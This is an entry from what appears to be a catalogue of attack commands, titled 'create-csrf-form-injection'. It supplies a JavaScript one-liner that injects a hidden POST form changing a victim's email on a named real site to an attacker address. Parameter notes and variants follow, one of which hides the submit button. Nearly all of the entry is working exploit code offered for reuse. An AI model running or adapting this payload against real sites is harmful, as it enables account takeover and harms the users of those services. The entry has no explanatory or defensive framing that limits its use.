---
id: cmd-uuid-1
data: >-
  var FormEl = `<form action="https://new.cs.money/change_email"
  method="POST"><input type="hidden" name="email"
  value="nnez+attacker@wearehackerone.com" /><button type="submit"
  style="font-size:28pt;z-index:99999">Submit</button></form>`; var Div =
  document.createElement('div'); Div.innerHTML = FormEl;
  document.body.appendChild(Div);
tags:
  - csrf
  - javascript
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.655Z'
verified: false
validated: true
submitted: true
---
# create-csrf-form-injection

## Command

```javascript
var FormEl = `<form action="https://new.cs.money/change_email" method="POST"><input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" /><button type="submit" style="font-size:28pt;z-index:99999">Submit</button></form>`; var Div = document.createElement('div'); Div.innerHTML = FormEl; document.body.appendChild(Div);
```

## Description

This JavaScript command, executed in a browser console, dynamically creates an HTML form for CSRF exploitation, targeting the change_email endpoint with an attacker email, and appends it to the page for submission.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| action | Target URL for form submission (e.g., https://new.cs.money/change_email) | Yes |
| method | HTTP method (POST) | Yes |
| name="email" | Hidden input value for the email parameter | Yes |
| style | CSS for submit button visibility (font-size:28pt;z-index:99999) | No |

## Examples

### Basic Usage

```javascript
var FormEl = `<form action="https://new.cs.money/change_email" method="POST"><input type="hidden" name="email" value="attacker@example.com" /><button type="submit">Submit</button></form>`; var Div = document.createElement('div'); Div.innerHTML = FormEl; document.body.appendChild(Div);
```

### Advanced Usage

Customize email and add more inputs:

```javascript
var FormEl = `<form action="https://target.com/endpoint" method="POST"><input type="hidden" name="email" value="custom@attacker.com" /><input type="hidden" name="other" value="value" /><button type="submit" style="display:none">Submit</button></form>`; var Div = document.createElement('div'); Div.innerHTML = FormEl; document.body.appendChild(Div);
```

## Expected Output

The form is appended to the document body without console errors. A submit button appears (if styled), and inspecting the DOM shows the form element. Upon submission, a POST request is sent.

## Related

- [[Related Procedure]]
